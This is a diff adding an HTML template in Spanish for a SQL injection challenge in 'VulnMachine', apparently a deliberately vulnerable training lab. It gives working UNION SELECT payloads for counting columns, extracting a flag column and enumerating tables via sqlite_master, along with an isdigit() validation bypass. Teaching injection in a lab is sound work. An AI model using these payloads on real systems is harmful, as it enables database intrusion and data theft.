@@ -1,0 +1,44 @@
+{% extends "base.html" %}
+{% block title %}C2 – Error-Based SQLi | VulnMachine{% endblock %}
+{% block content %}
+<div style="flex-direction:column;align-items:flex-start;" class="flex gap-2 mb-2">
+  <a href="/" class="btn btn-ghost" style="font-size:0.75rem;padding:0.3rem 0.8rem;">← Volver</a>
+  <h1>CHALLENGE 02</h1>
+  <h2>Error-Based SQL Injection</h2>
+</div>
+<div class="card mb-2">
+  <p style="line-height:1.8;color:var(--muted);font-family:var(--font-mono);font-size:0.85rem;">
+    El parámetro <span style="color:var(--accent)">?id=</span> de la vista de producto es vulnerable.<br>
+    <strong style="color:var(--accent3)">Nivel 1</strong>: Los errores SQL se muestran en pantalla — úsalos para enumerar la base de datos.<br>
+    <strong style="color:var(--warn)">Nivel 2</strong>: Validación débil de tipo numérico que puede eludirse con UNION SELECT.
+  </p>
+</div>
+<div class="grid-2">
+  <div class="card" style="border-color:rgba(57,255,20,0.4);text-align:center;">
+    <div style="font-family:var(--font-head);font-size:3rem;color:var(--accent3);margin-bottom:0.5rem;">1</div>
+    <div style="font-weight:700;margin-bottom:0.5rem;">Mensajes de error expuestos</div>
+    <span class="badge badge-easy">SIN FILTRO</span>
+    <p style="font-size:0.82rem;color:var(--muted);margin:1rem 0;">
+      Prueba <code style="color:var(--accent);background:rgba(0,212,255,0.1);padding:1px 4px;">?id=1 UNION SELECT 1,secret_flag,3,4,5,6 FROM products--</code>
+    </p>
+    <a href="/challenge/2/level1?id=1" class="btn btn-primary" style="background:var(--accent3);color:#000;">ACCEDER</a>
+  </div>
+  <div class="card" style="border-color:rgba(255,170,0,0.4);text-align:center;">
+    <div style="font-family:var(--font-head);font-size:3rem;color:var(--warn);margin-bottom:0.5rem;">2</div>
+    <div style="font-weight:700;margin-bottom:0.5rem;">Validación numérica débil</div>
+    <span class="badge badge-medium">isdigit() BYPASS</span>
+    <p style="font-size:0.82rem;color:var(--muted);margin:1rem 0;">
+      isdigit() falla con espacios. Intenta <code style="color:var(--accent);background:rgba(0,212,255,0.1);padding:1px 4px;">?id=1 UNION...</code>
+    </p>
+    <a href="/challenge/2/level2?id=1" class="btn btn-primary" style="background:var(--warn);color:#000;">ACCEDER</a>
+  </div>
+</div>
+<div class="hint-box mt-3">
+  <div class="hint-title">💡 Técnica: UNION SELECT</div>
+  <p>
+    Primero determina el número de columnas: <code>?id=1 ORDER BY 6--</code><br>
+    Luego extrae datos: <code>?id=0 UNION SELECT 1,secret_flag,3,4,5,6 FROM products WHERE id=3--</code><br>
+    También puedes enumerar tablas: <code>?id=0 UNION SELECT 1,name,3,4,5,6 FROM sqlite_master--</code>
+  </p>
+</div>
+{% endblock %}
